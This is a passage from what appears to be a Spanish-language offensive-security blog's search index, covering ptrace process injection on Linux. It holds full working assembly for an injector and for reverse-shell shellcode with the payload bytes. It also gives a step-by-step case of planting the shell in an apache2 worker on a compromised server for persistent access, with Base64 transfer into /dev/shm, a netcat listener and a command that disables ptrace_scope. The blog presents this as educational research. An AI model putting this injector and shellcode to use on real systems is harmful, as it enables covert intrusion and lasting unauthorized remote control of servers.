ahora comenzar\u00e1 a ejecutar el shellcode inyectado.</p>"},{"location":"research/malware-dev/ptrace-injection/#el-shellcode-reverse-tcp-shell","title":"El shellcode: Reverse TCP shell","text":"<p>El shellcode inyectado (<code>proc_inj_rev_tcp.asm</code>) no es una reverse shell convencional. Est\u00e1 dise\u00f1ado espec\u00edficamente para el contexto de inyecci\u00f3n en procesos, con dos caracter\u00edsticas clave:</p> <ul> <li><code>fork</code>: Crea un proceso hijo que ejecuta la reverse shell, mientras que el proceso padre retoma la ejecuci\u00f3n del tracee.</li> <li><code>setsid</code>: El proceso hijo crea una nueva sesi\u00f3n, desvincul\u00e1ndose del terminal y del grupo de procesos del padre.</li> </ul>"},{"location":"research/malware-dev/ptrace-injection/#flujo-del-proceso-padre","title":"Flujo del Proceso Padre","text":"<pre><code>; FORK\n    mov rax, 57\n    syscall\n\n    cmp rax, 0           ; si rax==0 se trata del hijo\n    jz .child            \n\n    lea r11, [rel _start] ; r11 = direcci\u00f3n de _start = mmap_base = RIP inicial del shellcode\n\n    ; Proceso Padre\n    mov r14, [r11+4088] ; Obtiene direcci\u00f3n de retorno\n    jmp r14             ; Salta a la direcci\u00f3n de retorno sobreescribiendo el registro RIP\n</code></pre> <p>Tras el <code>fork</code>, el proceso padre necesita volver al punto exacto donde fue interrumpido. Para ello, obtiene la direcci\u00f3n base del shellcode en memoria (que coincide con el inicio de la regi\u00f3n definida tras <code>mmap</code>). Sumando 4088 obtiene la posici\u00f3n donde el inyector almacen\u00f3 la direcci\u00f3n de retorno original (paso 9). Finalmente, haciendo uso de la syscall <code>jmp</code> se salta a esa direcci\u00f3n, retomando su ejecuci\u00f3n como si nada hubiera pasado.</p> <p>Se utiliza <code>r11</code> intencionalmente porque es un \u2018clobbered register\u2019. Por tanto, al usar <code>r11</code> nos aseguramos de no modificar ning\u00fan registro funcional del proceso tracee que pudiera afectar a su ejecuci\u00f3n futura. </p>"},{"location":"research/malware-dev/ptrace-injection/#flujo-del-proceso-hijo","title":"Flujo del proceso Hijo","text":"<pre><code>.child\n\n    ; SETSID\n    mov rax, 112\n    syscall\n\n    ; SOCKET \u2192 CONNECT \u2192 DUP2 \u2192 EXECVE\n</code></pre> <p>El proceso hijo invoca a la syscall <code>setsid</code> (syscall n\u00famero 112) para crear una nueva sesi\u00f3n. Esto lo desvincula del terminal controlador y del grupo de procesos del padre, haciendo que la reverse shell sea independiente del proceso original.</p> <p>Tras esto, se ejecuta la secuencia est\u00e1ndar de una reverse TCP shell, explicada en el art\u00edculo Reverse TCP Shell.</p>"},{"location":"research/malware-dev/ptrace-injection/#codigo-completo","title":"C\u00f3digo Completo","text":""},{"location":"research/malware-dev/ptrace-injection/#proc_injasm-inyector","title":"<code>proc_inj.asm</code> (Inyector)","text":"<pre><code>section .data\nshellcode:\n    db 0xb8, 0x39, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48\n    db 0x83, 0xf8, 0x00, 0x74, 0x11, 0x4c, 0x8d, 0x1d\n    db 0xec, 0xff, 0xff, 0xff, 0x4d, 0x8b, 0xb3, 0xf8\n    db 0x0f, 0x00, 0x00, 0x41, 0xff, 0xe6, 0xb8, 0x70\n    db 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x29, 0x00\n    db 0x00, 0x00, 0xbf, 0x02, 0x00, 0x00, 0x00, 0xbe\n    db 0x01, 0x00, 0x00, 0x00, 0x48, 0x31, 0xd2, 0x0f\n    db 0x05, 0x49, 0x89, 0xc0, 0xb8, 0x2a, 0x00, 0x00\n    db 0x00, 0x4c, 0x89, 0xc7, 0x4d, 0x31, 0xc9, 0x41\n    db 0x51, 0x49, 0xba, 0x02, 0x00, 0x11, 0x5c, 0x7f\n    db 0x00, 0x00, 0x01, 0x41, 0x52, 0x48, 0x89, 0xe6\n    db 0xba, 0x10, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48\n    db 0x31, 0xf6, 0xb8, 0x21, 0x00, 0x00, 0x00, 0x4c\n    db 0x89, 0xc7, 0x0f, 0x05, 0x48, 0xff, 0xc6, 0x48\n    db 0x83, 0xfe, 0x03, 0x7c, 0xed, 0xb8, 0x3b, 0x00\n    db 0x00, 0x00, 0x6a, 0x00, 0x49, 0xbc, 0x2f, 0x62\n    db 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x41, 0x54\n    db 0x48, 0x89, 0xe7, 0x6a, 0x00, 0x48, 0x89, 0xe6\n    db 0x6a, 0x00, 0x48, 0x89, 0xe2, 0x0f, 0x05, 0xb8\n    db 0x3c, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x0f\n    db 0x05, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90\nsc_len equ $ - shellcode\n\nsection .bss\n    regs resq 27  ; sizeof(user_regs_struct) en x86_64  (27x8 bytes)\n    regs_ori resq 27\n    regs_sys resq 27 \n\nsection .text\nglobal _start\n_start:\n\n    ; PID\n    mov r15, 2120\n\n; 1 Attach y detenci\u00f3n del proceso:\n\n    ; PTRACE_ATTACH\n    mov rax, 101\n    mov rdi, 16          ; PTRACE_ATTACH (0x10)\n    mov rsi, r15         ; PID\n    xor rdx,rdx          ; addr\n    xor r10, r10         ; data\n    syscall\n\n    ; WAIT4: \n        ; Cuando se hace PTRACE_ATTACH, el kernel env\u00eda SIGSTOP al proceso objetivo. \n        ; Es necesario llamar a wait4 para bloquear al tracer hasta que el proceso tracee  \n        ; est\u00e9 efectivamente detenido antes de poder manipularlo.\n\n        mov rax, 61\n        mov rdi, r15            ; PID a esperar (-1 para cualquier hijo)\n        sub rsp, 8\n        mov rsi, rsp            ; &amp;status\n        xor rdx, rdx            ; options\n        xor r10, r10            ; rusage\n        syscall\n\n; -----------------------------------------\n\n; 2 Preservaci\u00f3n del contexto de ejecuci\u00f3n\n\n    ; PTRACE_GETREGS\n    mov rax, 101\n    mov rdi, 12   ; PTRACE_GETREGS\n    mov rsi, r15  ; PID\n    xor rdx, rdx  ; addr\n    lea r10, [rel regs] ; puntero al buffer donde se va almacenar la estructura de registros\n    syscall\n\n    ; En este punto, regs contiene:\n    ; 0x00  r15\n    ; 0x08  r14\n    ; 0x10  r13\n    ; 0x18  r12\n    ; 0x20  rbp\n    ; 0x28  rbx\n    ; 0x30  r11\n    ; 0x38  r10\n    ; 0x40  r9\n    ; 0x48  r8\n    ; 0x50  rax\n    ; 0x58  rcx\n    ; 0x60  rdx\n    ; 0x68  rsi\n    ; 0x70  rdi\n    ; 0x78  orig_rax\n    ; 0x80  rip\n    ; 0x88  cs\n    ; 0x90  eflags\n    ; 0x98  rsp\n    ; 0xA0  ss\n    ; 0xA8  fs_base\n    ; 0xB0  gs_base\n    ; 0xB8  ds\n    ; 0xC0  es\n    ; 0xC8  fs\n    ; 0xD0  gs\n\n    ; Copia de los registros originales del traceee en el buffer de backup\n    lea rsi, [rel regs]       ; RSI se usa como puntero de origen y va avanzando\n    lea rdi, [rel regs_ori]   ; RDI se usa como puntero destino y va avanzando\n\n    mov rcx, 27               ; RCX se usa como contador y se va decrementando hasta 0\n    cld                       ; DF=0 (direcci\u00f3n de copia ascendente)\n    rep movsq                 ; mueve RCX qwords: [RSI] -&gt; [RDI]\n\n                    ; movsq copia un qword (8 bytes) desde la direcci\u00f3n apuntada por RSI hacia la direcci\u00f3n apuntada por RDI   \n                    ; rep repite esa operaci\u00f3n RCX veces\n\n; -----------------------------------------\n\n; 3 Inyecci\u00f3n de la instrucci\u00f3n syscall (0x0f 0x05)\n\n    mov r12, [regs+0x80]   ; Contenido del RIP del proceso tracee (direcci\u00f3n de la pr\u00f3xima instrucci\u00f3n a ejecutar)\n\n    ; PTRACE_PEEKDATA (leer memoria) Se leen 8 bytes a partir de la direcci\u00f3n actual a la que apunta el RIP del proceso tracee\n    mov rax, 101\n    mov rdi, 2       ; PTRACE_PEEKDATA\n    mov rsi, r15     ; PID\n    mov rdx, r12     ; addr\n    sub rsp, 8       ; 8 bytes\n    mov r10, rsp     ; puntero a data (direccion donde se almacenar\u00e1 la info le\u00edda)\n    syscall \n\n    mov r11, [rsp] ; En r11 y en el tope del stack se encuentra el valor al que apunta RIP del tracee\n    mov r13, r11 ; Backup del valor original\n    and r11, 0xFFFFFFFFFFFF0000 ; limpiar los 2 bytes bajos\n    or r11, 0x000000000000050F  ; insertar syscall (0x0f 0x05 en little-endian)\n\n    ; PTRACE_POKEDATA (escribir en memoria)\n    mov rax, 101\n    mov rdi, 5     ; PTRACE_POKEDATA\n    mov rsi, r15   ; PID\n    mov rdx, r12   ; addr \n    mov r10, r11   ; valor de 8 bytes a escribir\n    syscall\n\n;Valor en registro/hex: 0x00007ffe6f9001b0\n\n;Descomposici\u00f3n:\n;  0x 00 00 7f fe 6f 90 01 b0\n;     \u25b2                    \u25b2\n;     \u2502                    \u2502\n;    MSB                 LSB\n;   (m\u00e1s significativo) (menos significativo)\n\n;En memoria (little-endian, LSB primero):\n\n;RIP \u2192 0x7f7a85496687:  \u250c\u2500\u2500\u2500\u2500\u2510\n;                       \u2502 b0 \u2502 \u2190 Primer byte, primera instrucci\u00f3n\n;      0x7f7a85496688:  \u251c\u2500\u2500\u2500\u2500\u2524\n;                       \u2502 01 \u2502\n;      0x7f7a85496689:  \u251c\u2500\u2500\u2500\u2500\u2524\n;                       \u2502 90 \u2502\n;      0x7f7a8549668a:  \u251c\u2500\u2500\u2500\u2500\u2524\n;                       \u2502 6f \u2502\n;      0x7f7a8549668b:  \u251c\u2500\u2500\u2500\u2500\u2524\n;                       \u2502 fe \u2502\n;      0x7f7a8549668c:  \u251c\u2500\u2500\u2500\u2500\u2524\n;                       \u2502 7f \u2502\n;      0x7f7a8549668d:  \u251c\u2500\u2500\u2500\u2500\u2524\n;                       \u2502 00 \u2502\n;      0x7f7a8549668e:  \u251c\u2500\u2500\u2500\u2500\u2524\n;                       \u2502 00 \u2502\n;                       \u2514\u2500\u2500\u2500\u2500\u2518\n\n; -----------------------------------------\n\n; 4 Configuraci\u00f3n de registros para MMAP\n\n    ; MMAP\n\n        mov qword [regs+0x50], 9       ; (RAX) Se sustituye todo el valor del registro       N\u00famero de syscall para mmap\n        mov qword [regs+0x70],0        ; (RDI)       rdi = addr = 0 (NULL) \u2192 Pide al kernel que elija la direcci\u00f3n\n        mov qword [regs+0x68],4096     ; (RSI)       rsi = length = 4096 bytes (1 p\u00e1gina t\u00edpica)\n        mov qword [regs+0x60],7        ; (RDX)       rdx = prot = 7 =&gt; PROT_READ(1) | PROT_WRITE(2) | PROT_EXEC(4)\n        mov qword [regs+0x38],34       ; (R10)       r10 = flags = 34 =&gt; MAP_PRIVATE(0x2) | MAP_ANONYMOUS(0x20)\n        mov qword [regs+0x48],-1       ; (R8)        r8 = fd = -1 (usado con MAP_ANONYMOUS; -1 indica \"no file\")\n        mov qword [regs+0x40],0        ; (R9)        r9 = offset = 0 (desplazamiento en el fd; irrelevante con ANONYMOUS)\n\n    ; PTRACE_SETREGS\n        mov rax, 101\n        mov rdi, 13    ; PTRACE_SETREGS\n        mov rsi, r15   ; PID\n        xor rdx, rdx   ; addr\n        lea r10, [rel regs] ; puntero al buffer donde se encuentra la estructura de registros\n        syscall\n\n; -----------------------------------------\n\n; 5 Ejecuci\u00f3n controlada de la syscall MMAP\n\n    ;PTRACE_SINGLESTEP\n    mov rax, 101\n    mov rdi, 9       ; PTRACE_SINGLESTEP\n    mov rsi, r15     ; PID\n    xor rdx, rdx     ; addr\n    xor r10, r10     ; data\n    syscall\n\n    ; WAIT4: \n    mov rax, 61\n    mov rdi, r15            ; PID a esperar (-1 para cualquier hijo)\n    sub rsp, 8\n    mov rsi, rsp            ; &amp;status\n    xor rdx, rdx            ; options\n    xor r10, r10            ; rusage\n    syscall\n\n    ; PTRACE_GETREGS\n    mov rax, 101\n    mov rdi, 12   ; PTRACE_GETREGS\n    mov rsi, r15  ; PID\n    xor rdx, rdx  ; addr\n    lea r10, [rel regs_sys] ; puntero al buffer donde se va almacenar la estructura de registros\n    syscall\n\n\n; -----------------------------------------\n\n; 6 Obtenci\u00f3n del resultado de la syscall MMAP\n\n    xor r12, r12 \n    mov r12, [regs_sys+0x50]       ; (RAX) direcci\u00f3n donde comienza la zona de memoria reservada com permisos RWX\n\n; -----------------------------------------\n\n; 7 Restauraci\u00f3n del contenido ubicado en la direcci\u00f3n a la que apunta el registro RIP del tracee\n\n        xor r14, r14\n        mov r14, [regs_ori+0x80]\n\n        ; PTRACE_POKEDATA (escribir en memoria)\n        mov rax, 101\n        mov rdi, 5     ; PTRACE_POKEDATA\n        mov rsi, r15   ; PID\n        mov rdx, r14   ; addr \n        mov r10, r13   ; valor de 8 bytes a escribir\n        syscall\n\n        ; Comprobaci\u00f3n de que se haya restaurado el bytearray de manera adecuada\n        ; PTRACE_PEEKDATA (leer memoria)\n        ;mov rax, 101\n        ;mov rdi, 2       ; PTRACE_PEEKDATA\n        ;mov rsi, r15     ; PID\n        ;mov rdx, r14     ; addr\n        ;sub rsp, 8\n        ;mov r10, rsp     ; puntero a data (direccion donde se almacenar\u00e1 la info le\u00edda)\n        ;syscall \n\n; -----------------------------------------\n\n; 8 Restauraci\u00f3n de los registros originales del proceso tracee\n\n        ; PTRACE_SETREGS\n        mov rax, 101\n        mov rdi, 13    ; PTRACE_SETREGS\n        mov rsi, r15   ; PID\n        xor rdx, rdx   ; addr\n        lea r10, [rel regs_ori] ; puntero al buffer donde se encuentra la estructura de registros\n        syscall\n\n; -----------------------------------------\n\n; 9 Almacenamiento del RIP de retorno en los \u00faltimos 8 bytes de la regi\u00f3n de memoria reservada por MMAP\n\n        ; PTRACE_POKEDATA (escribir en memoria)\n        mov rax, 101\n        mov rdi, 5     ; PTRACE_POKEDATA\n        mov rsi, r15   ; PID\n        lea rdx, [r12+4088]   ; addr \n        mov r10, r14   ; valor de 8 bytes a escribir\n        syscall\n\n        ; Verificar que se ha escrito el valor del RIP de retorno en la regi\u00f3n de memoria reservada por MMAP\n\n        ; PTRACE_PEEKDATA\n        ;mov rax, 101\n        ;mov rdi, 2       ; PTRACE_PEEKDATA\n        ;mov rsi, r15     ; PID\n        ;lea rdx, [r12+4088]     ; addr\n        ;sub rsp, 8       ; 8 bytes\n        ;mov r10, rsp     ; puntero a data (direccion donde se almacenar\u00e1 la info le\u00edda)\n        ;syscall \n\n\n; -----------------------------------------\n\n; 10 Inyecci\u00f3n del shellcode en la zona de memoria reservada (PTRACE_POKEDATA escribe 8 bytes)\n\n    xor r13,r13\n    lea r13, [rel shellcode]   ; puntero al shellcode\n    xor r14, r14\n    mov r14, sc_len / 8        ; contador de palabras a escribir\n    push r12\n\n    .loop_inj:\n\n        cmp r14, 0     ; compara el contador de palabras a escribir con 0\n        jz .done       ; si contador == 0, saltar a .done\n\n        ; PTRACE_POKEDATA\n        mov rax, 101\n        mov rdi, 5     ; PTRACE_POKEDATA\n        mov rsi, r15   ; PID\n        mov rdx, r12   ; addr \n        mov r10, [r13] ; valor de 8 bytes a escribir\n        syscall\n\n        add r12, 8\n        add r13, 8\n        dec r14\n        jmp .loop_inj\n\n; -----------------------------------------\n\n    .done\n\n        ; Verificar que el shellcode se escribi\u00f3 bien\n        ;mov rax, 101\n        ;mov rdi, 2          ; PTRACE_PEEKDATA\n        ;mov rsi, r15\n        ;mov rdx, r12        ; direcci\u00f3n mmap\n        ;sub rsp, 8       ; 8 bytes\n        ;mov r10, rsp     ; puntero a data (direccion donde se almacenar\u00e1 la info le\u00edda)\n        ;syscall \n\n        pop r12\n\n        mov qword [regs_ori+0x80], r12   ; RIP == direcci\u00f3n del inicio de la memoria reservada == inicio del shellcode\n        mov qword [regs_ori+0x78], -1    ; orig_rax = -1 (evita syscall restart)\n\n        ; PTRACE_SETREGS\n        mov rax, 101\n        mov rdi, 13    ; PTRACE_SETREGS\n        mov rsi, r15   ; PID\n        xor rdx, rdx   ; addr\n        lea r10, [rel regs_ori] ; puntero al buffer donde se encuentra la estructura de registros\n        syscall\n\n    ; PTRACE_DETACH\n    mov rax, 101\n    mov rdi, 17    ; PTRACE_DETACH\n    mov rsi, r15   ; PID\n    xor rdx, rdx   ; addr\n    xor r10, r10   ; signal = 0 (no enviar se\u00f1al)\n    syscall\n\n    ; EXIT\n    mov rax, 60\n    xor rdi,rdi \n    syscall\n</code></pre>"},{"location":"research/malware-dev/ptrace-injection/#proc_inj_rev_tcpasm-shellcode","title":"<code>proc_inj_rev_tcp.asm</code> (Shellcode)","text":"<pre><code>section .text\nglobal _start\n_start:\n\n    ; FORK\n    mov rax, 57\n    syscall\n\n    cmp rax, 0           ; si rax==0 se trata del hijo\n    jz .child            \n\n                            ; r11 porque es un registro clobbered (destruido por las syscalls)\n                                ; por tanto, no se est\u00e1 modificando un registro funcional del proceso tracee\n    lea r11, [rel _start] ; r11 = direcci\u00f3n de _start = mmap_base = RIP inicial del shellcode\n\n                            ; Nunca se debe asignar un valor a R11 antes de un syscall si se pretende recuperar despu\u00e9s\n\n    ; Proceso Padre\n    mov r14, [r11+4088] ; Obtiene direcci\u00f3n de retorno\n    jmp r14             ; Salta a la direcci\u00f3n de retorno sobreescribiendo el registro RIP\n\n.child\n\n    ; SETSID\n    mov rax, 112\n    syscall\n\n    ; SOCKET\n    mov rax, 41\n    mov rdi, 2 ;IPV4\n    mov rsi, 1 ;TCP\n    xor rdx, rdx ; Default\n    syscall\n\n    ; Store socket FD\n    mov r8, rax\n\n    ; CONNECT\n    mov rax, 42\n    mov rdi, r8\n                    ;   Stack        Low  &lt;----------- High\n    ; Entrada esperada: 02 00 11 5c C0 A8 12 8D 00 00 00 00 00 00 00 00   \n    ;                   \u2514\u2500\u2500\u2518  \u2514\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n    ;                   0-1   2-3   4-7         8-15         (16 bytes en total)\n    ;                   fam   port  IP          padding\n\n    ; Mapeado de los campos de sockaddr_in:\n                        ; Bytes 0-1:   02 00           \u2192 sin_family (AF_INET = 2)\n                        ; Bytes 2-3:   11 5c           \u2192 sin_port (4444)\n                        ; Bytes 4-7:   7F 00 00 01     \u2192 sin_addr (127.0.0.1)\n                        ; Bytes 8-15:  00 00 00 00...  \u2192 sin_zero (padding)\n    xor r9,r9 ; 0\n    push r9 ; 64 bits de padding a 0 (sin_zero)(8 bytes)\n    mov r10, 0x0100007F5c110002\n    push r10 ; sin_family + sin_port + sin_addr (8 bytes)\n    mov rsi, rsp ; direccion del tope de la pila\n    mov rdx, 16 ;IPV4 (espera 16 bytes)\n    syscall\n\n    xor rsi,rsi\n.dup2:                        ; stdin(0), stdout(1), stderr(2) redirigidos al socket\n    ;DUP2\n    mov rax, 33\n    mov rdi, r8\n    syscall \n    inc rsi\n    cmp rsi, 3\n    jl .dup2\n\n    ; EXEXCVE\n    mov rax, 59\n\n    push 0                       ; null terminator de /bin/sh -&gt; /bin/sh\\0\n    mov r12, 0x68732f6e69622f    ; /bin/sh (2F 62 69 6E 2F 73 68) en little-endian\n    push r12                     ; string /bin/sh\n    mov rdi, rsp\n\n    push 0                       ; argv = {NULL}\n    mov rsi, rsp\n\n    push 0                       ; envp = {NULL}\n    mov rdx, rsp\n\n    syscall \n\n.done:\n    ; EXIT\n    mov rax, 60                    ; syscall: exit\n    xor rdi, rdi                   ; exit code = 0 (\u00e9xito)\n    syscall\n</code></pre>"},{"location":"research/malware-dev/ptrace-injection/#compilacion","title":"Compilaci\u00f3n","text":"<pre><code># Compilar el shellcode de reverse shell\nnasm -f elf64 proc_inj_rev_tcp.asm -o proc_inj_rev_tcp.o\nld proc_inj_rev_tcp.o -o proc_inj_rev_tcp\n\n# Extraer bytes del shellcode (para actualizar la secci\u00f3n .data del inyector)\nobjcopy -O binary --only-section=.text proc_inj_rev_tcp proc_inj_rev_tcp.bin\nxxd -i proc_inj_rev_tcp.bin\n\n# Compilar el inyector\nnasm -f elf64 proc_inj.asm -o proc_inj.o\nld proc_inj.o -o proc_inj\n</code></pre>"},{"location":"research/malware-dev/ptrace-injection/#caso-practico","title":"Caso Pr\u00e1ctico","text":"<p>Se ha comprometido un servidor Linux y se tiene acceso como root. El objetivo es inyectar una reverse shell en un proceso de larga duraci\u00f3n de un usuario del sistema para mantener acceso persistente. Al ser root no hay restricciones de <code>ptrace_scope</code> (root puede trazar cualquier proceso del sistema independientemente de su configuraci\u00f3n).</p> <p>En primer lugar, comenzamos editando el script <code>proc_inj_rev_tcp.asm</code>, ya que las modificaciones son datos propios del atacante. Para ello, debemos obtener la direcci\u00f3n IP de la m\u00e1quina atacante y definir un puerto de escucha.</p> <pre><code># M\u00e1quina atacante\nip a\n</code></pre> <p></p> <p>La IP del atacante es la 192.168.18.245, que en hexadecimal equivale a <code>0xC0A812F5</code>. El puerto de escucha que utilizaremos ser\u00e1 el 443, equivalente a <code>0x1BB</code>.</p> <pre><code>; CONNECT\nmov rax, 42\nmov rdi, r8\n\n;   Stack        Low  &lt;----------- High\n; Entrada esperada (16 bytes):\n; 02 00 01 BB C0 A8 12 F5 00 00 00 00 00 00 00 00\n; \u2514\u2500\u2500\u2518 \u2514\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n; fam  port      IP              padding\n\n; Mapeo sockaddr_in:\n; Bytes 0-1:  02 00         -&gt; sin_family (AF_INET = 2)\n; Bytes 2-3:  01 BB         -&gt; sin_port   (443, big-endian)\n; Bytes 4-7:  C0 A8 12 F5   -&gt; sin_addr   (192.168.18.245)\n; Bytes 8-15: 00 ... 00     -&gt; sin_zero   (padding)\n\nxor r9, r9\npush r9                         ; 8 bytes a 0 (sin_zero)\nmov r10, 0xF512A8C0BB010002      ; [02 00][01 BB][C0 A8 12 F5]\npush r10                         ; fam+port+ip\nmov rsi, rsp                     ; sockaddr_in*\nmov rdx, 16                      ; sizeof(sockaddr_in)\nsyscall\n</code></pre> <p>Compilamos el script y obtenemos los bytes que formar\u00e1n el shellcode a inyectar.</p> <pre><code># Compilar el shellcode de reverse shell\nnasm -f elf64 proc_inj_rev_tcp.asm -o proc_inj_rev_tcp.o\nld proc_inj_rev_tcp.o -o proc_inj_rev_tcp\n\n# Extraer bytes del shellcode (para actualizar la secci\u00f3n .data del inyector)\nobjcopy -O binary --only-section=.text proc_inj_rev_tcp proc_inj_rev_tcp.bin\nxxd -i proc_inj_rev_tcp.bin\n</code></pre> <p></p> <p>El shellcode tiene un tama\u00f1o de 161 bytes. Dado que <code>PTRACE_POKEDATA</code> escribe exactamente 8 bytes por llamada, el tama\u00f1o total del shellcode debe ser m\u00faltiplo de 8. El siguiente m\u00faltiplo de 8 despu\u00e9s de 161 es 168, por lo que se a\u00f1aden 7 bytes NOP (<code>0x90</code>) como padding al final para completar los 168 bytes (168 / 8 = 21 escrituras).</p> <p>Una vez obtenidos los bytes que conforman el shellcode, podemos a\u00f1adir el bloque al script inyector <code>proc_inj.asm</code>.</p> <pre><code>; proc_inj.asm\n\nshellcode:\n    db 0xb8, 0x39, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48\n    db 0x83, 0xf8, 0x00, 0x74, 0x11, 0x4c, 0x8d, 0x1d\n    db 0xec, 0xff, 0xff, 0xff, 0x4d, 0x8b, 0xb3, 0xf8\n    db 0x0f, 0x00, 0x00, 0x41, 0xff, 0xe6, 0xb8, 0x70\n    db 0x00, 0x00, 0x00, 0x0f, 0x05, 0xb8, 0x29, 0x00\n    db 0x00, 0x00, 0xbf, 0x02, 0x00, 0x00, 0x00, 0xbe\n    db 0x01, 0x00, 0x00, 0x00, 0x48, 0x31, 0xd2, 0x0f\n    db 0x05, 0x49, 0x89, 0xc0, 0xb8, 0x2a, 0x00, 0x00\n    db 0x00, 0x4c, 0x89, 0xc7, 0x4d, 0x31, 0xc9, 0x41\n    db 0x51, 0x49, 0xba, 0x02, 0x00, 0x01, 0xbb, 0xc0\n    db 0xa8, 0x12, 0xf5, 0x41, 0x52, 0x48, 0x89, 0xe6\n    db 0xba, 0x10, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48\n    db 0x31, 0xf6, 0xb8, 0x21, 0x00, 0x00, 0x00, 0x4c\n    db 0x89, 0xc7, 0x0f, 0x05, 0x48, 0xff, 0xc6, 0x48\n    db 0x83, 0xfe, 0x03, 0x7c, 0xed, 0xb8, 0x3b, 0x00\n    db 0x00, 0x00, 0x6a, 0x00, 0x49, 0xbc, 0x2f, 0x62\n    db 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x41, 0x54\n    db 0x48, 0x89, 0xe7, 0x6a, 0x00, 0x48, 0x89, 0xe6\n    db 0x6a, 0x00, 0x48, 0x89, 0xe2, 0x0f, 0x05, 0xb8\n    db 0x3c, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x0f\n    db 0x05, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90\nsc_len equ $ - shellcode\n</code></pre> <p>Ya solo queda obtener el PID del proceso objetivo para completar la configuraci\u00f3n de los scripts. En este caso, usaremos como objetivo el proceso <code>apache2</code> del usuario <code>www-data</code> (aunque tambi\u00e9n podr\u00eda elegirse uno ejecut\u00e1ndose como root si se desea conservar los privilegios tras la conexi\u00f3n), ya que es un proceso de larga duraci\u00f3n que suele permanecer activo en un servidor web y cuyas conexiones salientes pueden pasar m\u00e1s desapercibidas.</p> <pre><code># M\u00e1quina v\u00edctima\nps -u www-data -o pid,etime,cmd\n</code></pre> <p></p> <p>Se elige uno de los worker processes (PID 5204) y se actualiza el valor en <code>proc_inj.asm</code>.</p> <pre><code>; proc_inj.asm\n\n; PID    \nmov r15, 5204\n</code></pre> <p>Una vez configurado el script inyector, lo compilamos.</p> <pre><code># Compilar el inyector\nnasm -f elf64 proc_inj.asm -o proc_inj.o\nld proc_inj.o -o proc_inj\n</code></pre> <p>Una vez que disponemos del ejecutable, es necesario alojarlo en la m\u00e1quina v\u00edctima. Existen numerosos m\u00e9todos para hacerlo, pero si no contamos con una shell completamente interactiva, mi opci\u00f3n preferida es transferirlo en Base64, reconstruirlo en <code>/dev/shm</code> y ejecutarlo desde ah\u00ed. </p> <pre><code># Convertir el binario a Base64 y mostrarlo por pantalla\nbase64 -w 0 ./proc_inj &gt; proc_inj.b64 &amp;&amp; cat proc_inj.b64\n</code></pre> <p>Antes de realizar la ejecuci\u00f3n en la m\u00e1quina objetivo recuerda mantenerte a la escucha en el puerto establecido.</p> <pre><code># M\u00e1quina atacante\nnc -nlvp 443\n</code></pre> <p>Una vez todo preparado, alojamos y ejecutamos el inyector en la m\u00e1quina objetivo.</p> <pre><code># M\u00e1quina v\u00edctima\n\n# Decodifica Base64 a binario en memoria (tmpfs), asigna permisos de ejecuci\u00f3n y ejecuta inmediatamente\necho '&lt;Base64&gt;' | base64 -d &gt; /dev/shm/proc_inj &amp;&amp; chmod +x /dev/shm/proc_inj &amp;&amp; /dev/shm/proc_inj\n</code></pre> <p>Inmediatamente despu\u00e9s, recibimos la conexi\u00f3n entrante desde la v\u00edctima.</p> <p></p>"},{"location":"research/malware-dev/ptrace-injection/#consideraciones-de-seguridad","title":"Consideraciones de seguridad","text":"<p>Para que <code>ptrace</code> funcione sobre el proceso objetivo, se debe cumplir al menos una de las siguientes condiciones de privilegio:</p> <ul> <li>El tracer debe tener el mismo UID que el tracee.</li> <li>El tracer debe tener la capability <code>CAP_SYS_PTRACE</code>.</li> <li>El tracer debe ejecutarse como <code>root</code>.</li> </ul> <p>Adem\u00e1s, el fichero <code>/proc/sys/kernel/yama/ptrace_scope</code> indica restricciones adicionales:</p> Valor Restricci\u00f3n 0 Sin restricciones 1 Solo hacia procesos hijos 2 Solo con <code>CAP_SYS_PTRACE</code> 3 Ptrace completamente deshabilitado <p>Se puede desactivar temporalmente realizando la siguiente operaci\u00f3n:</p> <pre><code>echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope\n</code></pre>"},{"location":"research/malware-dev/ptrace-injection/#agradecimientos","title":"Agradecimientos","text":"<p>Gracias por llegar hasta aqu\u00ed.</p> <p>Si encuentras errores o quieres mejorar/ampliar el art\u00edculo, el contenido del blog est\u00e1 abierto a Pull Requests. Toda contribuci\u00f3n es bienvenida.</p> <p>\u00a1Nos vemos en el pr\u00f3ximo art\u00edculo! ;)</p> <p>Ver tambi\u00e9n</p> <p>Reverse TCP Shell - La t\u00e9cnica base de Reverse TCP Shell usada como payload en este art\u00edculo</p>"},{"location":"research/malware-dev/reverse-shell/","title":"Reverse TCP Shell","text":"Reverse TCP Shell 15/01/2026 \u00b7 5 min <p>Reverse shell TCP implementado en ensamblador x86-64. Usando \u00fanicamente syscalls, sin dependencias.</p> <p>Uso responsable</p> <p>El contenido de este sitio web se publica exclusivamente con fines educativos e informativos. El autor no promueve, respalda ni se hace responsable del uso indebido o ilegal de la informaci\u00f3n aqu\u00ed expuesta. Cualquier acci\u00f3n realizada a partir de este contenido debe llevarse a cabo \u00fanicamente en entornos controlados, sistemas propios o con autorizaci\u00f3n expresa y verificable del propietario del sistema.</p>"},{"location":"research/malware-dev/reverse-shell/#introduccion","title":"Introducci\u00f3n","text":"<p>En la reverse shell es la m\u00e1quina objetivo quien inicia la conexi\u00f3n hacia el atacante, en lugar de que el atacante se conecte a la m\u00e1quina objetivo. Esto es \u00fatil para evadir firewalls que bloquean conexiones entrantes pero permiten 